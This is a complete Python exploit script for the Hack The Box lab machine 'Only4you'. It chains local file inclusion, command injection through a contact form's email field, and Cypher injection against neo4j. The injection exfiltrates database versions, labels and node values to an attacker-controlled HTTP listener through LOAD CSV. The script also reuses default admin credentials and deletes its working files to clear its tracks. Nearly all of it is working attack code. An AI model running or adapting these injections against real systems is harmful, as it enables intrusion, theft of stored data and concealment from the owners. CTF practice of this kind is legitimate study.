#!/usr/bin/env python3

'''
Only4you HTB
------------
Description: Local File Inclusion, Remote code execution and Cypher Injection (neo4j)
Author: Marss
Date: 23 Aug, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from os import system
from random import choices
from requests import get, post
from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
from signal import signal, SIGINT
from string import ascii_letters
from subprocess import Popen
from sys import argv

# debugging
import pdb

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Exploit class
class Exploit:

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))

    def __init__(self, args):
        
        self.args = args
        self.target = {
            'base_url': 'http://only4you.htb',
            'beta_domain_url': 'http://beta.only4you.htb'
        }
        self.temp_dir = f"/tmp/.{self.get_rand_str(5)}"
        self.curl_file = f"{self.temp_dir}/curl_data.txt"
        self.cookie_file = f"{self.temp_dir}/cookie_data.txt"
        self.log_file = 'data.log'
        
    def run(self):
        
        if self.target_response():

            if self.args.mode == 'lfi':
                self.local_file_inclusion()

            elif self.args.mode == 'rce':
                self.remote_code_execution(self.args.command, show_response=True)
            
            elif self.args.mode == 'cypheri':
                self.cypher_injection()
                # clear tracks
                self.remote_code_execution(f'rm -rf {self.temp_dir}')
                print('\n[-] Workstation removed')
                system(f'rm -f {self.log_file}')

    def target_response(self) -> bool:

        try:
            response = get(self.target['base_url'], timeout=5)

            if response.status_code == 200:
                print(f'\n[+] Target up: {response.url}')
                return True
            else:
                print(f'\n[-] Target response: {response.reason} {response.status_code}')
                return False

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        except ConnectionError:
            print(f'\n[x] Cannot resolve: {self.target["base_url"]}')
            exit('[!] Check the machine connection or resolve the specific domain on your local DNS server (/etc/hosts).')

    def local_file_inclusion(self):

        try:
            post_data = {'image': self.args.file}

            response = post(self.target['beta_domain_url'] + '/download',
                data=post_data,
                allow_redirects=False, 
                timeout=5)

            if response.status_code != 200 or len(response.text) == 0:
                print('\n[-] The file does not exist or we do not have permission to read it.')
                exit(1)
            
            print(f'\n{response.text}')

        except ConnectTimeout:
            print('\n[x] Connection error: ' + repr(error))
            exit(1)

    def remote_code_execution(self, command, show_response=False):
        
        rand_str = self.get_rand_str(5)

        try:
            post_data = {
                'name': rand_str,
                'email': f'{rand_str}@{rand_str}.{rand_str}' + ' && ' + command,
                'subject': rand_str,
                'message': rand_str
            }

            response = post(self.target['base_url'],
                data=post_data,
                allow_redirects=False)

            if response.status_code == 302 and show_response:
                print('\n[+] Command executed.')
            else:
                pass

        except Exception as error:
            print('[!] Error' + repr(error))
            exit(1)

    def cypher_injection(self):

        http_service_proc = self.open_http_service()
        self.prepare_session()
        
        injection = ''
        if self.args.version:
            injection = "' or 1=1 CALL dbms.components() YIELD versions UNWIND versions as version LOAD CSV FROM 'http://%s:%s/?version=' + version as l RETURN 0//" % (self.args.ip, str(self.args.port))
        elif self.args.labels:
            injection = "'  or 1=1 CALL db.labels() YIELD label LOAD CSV FROM 'http://%s:%s/?=' + label as l RETURN 0//" % (self.args.ip, str(self.args.port))
        elif self.args.values:
            injection = "' or 1=1 MATCH (x:%s) UNWIND keys(x) as k LOAD CSV FROM 'http://%s:%s/?' + k + '=' + toString(x[k]) as l RETURN 0//" % (self.args.values, self.args.ip, str(self.args.port))

        # prepare curl config file with cypher injection
        command = f"echo \"url = \\\"http://127.0.0.1:8001/search\\\"\ndata-urlencode = \\\"search={injection}\\\"\" > {self.curl_file}"
        self.remote_code_execution(command)
        
        print('[+] Sending injection.')
        # send injection
        command = f"curl -s --config {self.curl_file} -b \"$(cat {self.cookie_file})\""
        self.remote_code_execution(command)

        # kill http server
        http_service_proc.kill()

        # read log file
        self.print_response()
            
    def prepare_session(self):

        print(f'[+] Creating workstation: {self.temp_dir}')
        # create workstation
        self.remote_code_execution(f'mkdir -p {self.temp_dir}')

        # prepare curl config file to save cookie
        command = f"echo 'url = \"http://127.0.0.1:8001/login\"\ndata = \"username=admin&password=admin\"' > {self.curl_file}"
        self.remote_code_execution(command)
        
        # extract cookie to future requests
        command = "curl -s --config %s -i | grep Set-Cookie | awk '{print $2}' | tr -d ';' > %s" % (self.curl_file, self.cookie_file) 
        self.remote_code_execution(command)
        print('[+] Session cookie prepared.')
    
    def open_http_service(self):
        
        print(f'\n[+] Starting http service with python on port {self.args.port}')
        
        with open(self.log_file, 'wt') as logfile:
            command = f'python3 -m http.server {self.args.port}'
            service_process = Popen(command.split(), stdout=logfile, stderr=logfile)

        return service_process

    def print_response(self):

        print('\n[+] Response:')
        with open(self.log_file, 'rt') as logfile:
            print(logfile.read())

# Main flow
if __name__ == '__main__':

    title = '\n| Only4you (LFI & RCE & CYPHER INJECTION)|'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} lfi -f "/etc/hosts"
        python3 {argv[0]} rce -c "ping -c 1 10.10.10.10" (no output)
        python3 {argv[0]} cypheri -i 10.10.10.10 -p 4444 -V (list version)
        python3 {argv[0]} cypheri -i 10.10.10.10 -p 4444 -l (list labels)
        python3 {argv[0]} cypheri -i 10.10.10.10 -p 4444 -v "label_name" (list label values)
        '''
    )
    subparsers = parser.add_subparsers(dest='mode', required=True)

    lfi_parser = subparsers.add_parser('lfi', help='LFI mode')
    lfi_parser.add_argument('-f', '--file', type=str, required=True, help='File to read')
    
    rce_parser = subparsers.add_parser('rce', help='RCE mode')
    rce_parser.add_argument('-c', '--command', type=str, required=True, help='Command to execute')

    cypher_parser = subparsers.add_parser('cypheri', help='Cypher injection mode')
    cypher_parser.add_argument('-i', '--ip', type=str, required=True, help='Ip to open http service to receive data')
    cypher_parser.add_argument('-p', '--port', type=int, required=True, help='Port to open http service to receive data')
    cypher_parser.add_argument('-V', '--version', action='store_true', help='Dump neo4j version')
    cypher_parser.add_argument('-l', '--labels', action='store_true', help='Dump labels')
    cypher_parser.add_argument('-v', '--values', type=str, help='Dump label values')

    args = parser.parse_args()
    
    print(title)

    exploit = Exploit(args)
    exploit.run()